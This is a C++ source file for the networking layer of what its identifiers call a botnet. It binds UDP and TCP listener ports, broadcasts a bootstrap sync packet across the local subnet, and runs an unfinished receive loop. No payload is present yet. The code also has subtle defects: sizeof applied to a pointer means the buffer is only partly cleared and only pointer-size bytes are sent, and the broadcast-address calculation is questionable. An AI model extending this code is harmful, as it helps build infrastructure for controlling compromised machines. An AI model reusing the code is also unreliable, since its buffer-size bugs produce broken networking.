#include <malloc.h>
#include <thread>
#include "Communication.h"
#include "network.h"


//Private

//Public


Communication::Communication()
{
	udp_sock = socket(AF_INET, SOCK_DGRAM, 0);
	check(udp_sock, "can't create udp_sock");
	
	// Create a server hint structure for the server
	struct sockaddr_in serverHint;
	serverHint.sin_addr.S_un.S_addr = ADDR_ANY; // Us any IP address available on the machine
	serverHint.sin_family = AF_INET; // Address format is IPv4
	serverHint.sin_port = htons(54000); // Convert from little to big endian

	// Try and bind the socket to the IP and port
	check(bind(udp_sock, (struct sockaddr*)&serverHint, sizeof(serverHint)), "can't bind udp socket");

	tcp_sock = socket(AF_INET, SOCK_STREAM, 0);
	check(tcp_sock, "can't create tcp_sock");

	serverHint.sin_addr.S_un.S_addr = ADDR_ANY; // Us any IP address available on the machine
	serverHint.sin_family = AF_INET; // Address format is IPv4
	serverHint.sin_port = htons(55000); // Convert from little to big endian

	check(bind(tcp_sock, (struct sockaddr*)&serverHint, sizeof(serverHint)), "can't bind tcp socket");
	
	NetTree = NULL;
}

Communication::~Communication()
{
	delete NetTree;
}

//Sends a broadcast SyncRequest
void Communication::SyncRequest()
{
	//TODO - multiple networks
	ULONG32 host;
	ULONG32 netmask;

	char *buf = (char*)malloc(sizeof(struct botnet_pack));
	if (buf == NULL)
	{
		printf("%s\n", "can't allocate memory");
		exit(1);
	}

	struct botnet_pack* p = (struct botnet_pack*)buf;
	struct sockaddr_in addr;

	memset(buf, 0, sizeof(buf));
	memset(&addr, 0, sizeof(addr));

	//Calculating Broadcast IP
	host = InterfaceList[1].iiAddress.AddressIn.sin_addr.S_un.S_addr;
	netmask = InterfaceList[1].iiNetmask.AddressIn.sin_addr.S_un.S_addr;

	addr.sin_family = AF_INET;
	addr.sin_port = htons(54000);
	addr.sin_addr.S_un.S_addr = ~((netmask | host) ^ host);

	// Adding data to the packet (TODO)
	p->boot_strap = 1;
	
	//Send broadcast request for sync
	sendto(udp_sock, buf, sizeof(buf), 0, (struct sockaddr*)&addr, sizeof(addr));
	//Free the allocated data

	free(buf);
}

//Should be run on a seperate thread
void Communication::HandleIncomings()
{
	char* const buf = (char*)malloc(BOTNET_PACK_SIZE);
	
	//checking pointer allocation
	if (buf == nullptr)
	{
		perror("can't malloc HandleIncomings");
		exit(1);
	}

	while (1) // TODO - condition(advanced)
	{
		memset(buf, 0, BOTNET_PACK_SIZE);
		recv(udp_sock, buf, BOTNET_PACK_SIZE, 0);

		//...
	}

	free(buf);
}
